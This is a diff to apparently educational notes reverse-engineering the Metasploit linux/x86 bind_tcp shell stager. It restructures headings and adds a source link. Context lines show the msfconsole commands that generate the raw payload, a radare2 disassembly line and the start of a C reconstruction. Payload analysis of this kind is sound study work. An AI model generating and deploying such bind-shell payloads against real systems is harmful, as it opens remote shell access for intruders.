@@ -1,12 +1,16 @@
 # Metasploit linux/x86/shell/bind_tcp
 
-## Generate
+## Stager
+
+Source: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/linux/bind_tcp.rb
+
+### Generate
 ```
 msf5 > use payload/linux/x86/shell/bind_tcp
 msf5 payload(linux/x86/shell/bind_tcp) > generate -f raw -o stage1.bin
 ```
 
-## Disassembled Content
+### Disassembled Content
 ```
 $ r2 -a x86 -b 32 -c 'pd' stage1.bin
             0x00000000      6a7d           push 0x7d           ; syscall #125: int mprotect(void *addr, size_t len, int prot);
@@ -83,7 +87,7 @@ $ r2 -a x86 -b 32 -c 'pd' stage1.bin
             0x00000070      ff             invalid
 ```
 
-## Reconstructing with C Code:
+### Reconstructing with C Code:
 
 ```c
 #include <stdint.h>
